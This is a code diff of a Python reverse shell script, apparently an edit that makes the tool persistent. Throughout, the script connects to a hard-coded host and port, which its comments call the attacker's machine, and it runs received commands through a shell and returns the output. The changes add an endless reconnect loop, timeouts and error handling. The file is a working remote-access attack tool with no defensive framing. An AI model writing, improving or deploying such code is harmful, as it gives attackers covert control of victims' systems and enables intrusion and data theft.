@@ -1,41 +1,50 @@
 #!/usr/bin/env python3
 import socket
 import subprocess
+import time
+import sys
 import os
 
-def reverse_shell():
-    host = "10.162.6.102"
-    port = 3399
+def reverse_shell(host="10.162.6.102", port=3399):
+    max_retries = 10
+    retry_delay = 5
     
-    # Create a TCP socket
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    try:
-        # Connect to attacker's machine
-        sock.connect((host, port))
-        
-        # Start an interactive shell
-        while True:
-            # Send current working directory and prompt
-            cmd = f"{os.getcwd()}> "
-            sock.send(cmd.encode())
+    while True:
+        try:
+            # Create socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)
             
-            # Get command from attacker
-            data = sock.recv(4096).decode().strip()
-            if not data:
-                break
-                
-            # Execute command
-            result = subprocess.run(data, shell=True, capture_output=True)
-            output = result.stdout.decode() + result.stderr.decode()
+            # Connect to attacker
+            sock.connect((host, port))
+            print(f"[+] Connected to {host}:{port}")
             
-            # Send results back
-            sock.send(output.encode())
+            # Interactive shell loop
+            while True:
+                try:
+                    # Receive command
+                    cmd = sock.recv(4096).decode().strip()
+                    if not cmd:
+                        break
+                        
+                    # Execute and return output
+                    proc = subprocess.Popen(
+                        cmd,
+                        shell=True,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE
+                    )
+                    output, _ = proc.communicate(timeout=10)
+                    sock.sendall(output)
+                    
+                except Exception as e:
+                    sock.sendall(str(e).encode())
+                    
+        except Exception as e:
+            print(f"[-] Connection error: {e}")
+            time.sleep(retry_delay)
             
-    except Exception as e:
-        print(f"Error: {e}")
-    finally:
-        sock.close()
+    sock.close()
 
 if __name__ == "__main__":
     reverse_shell()
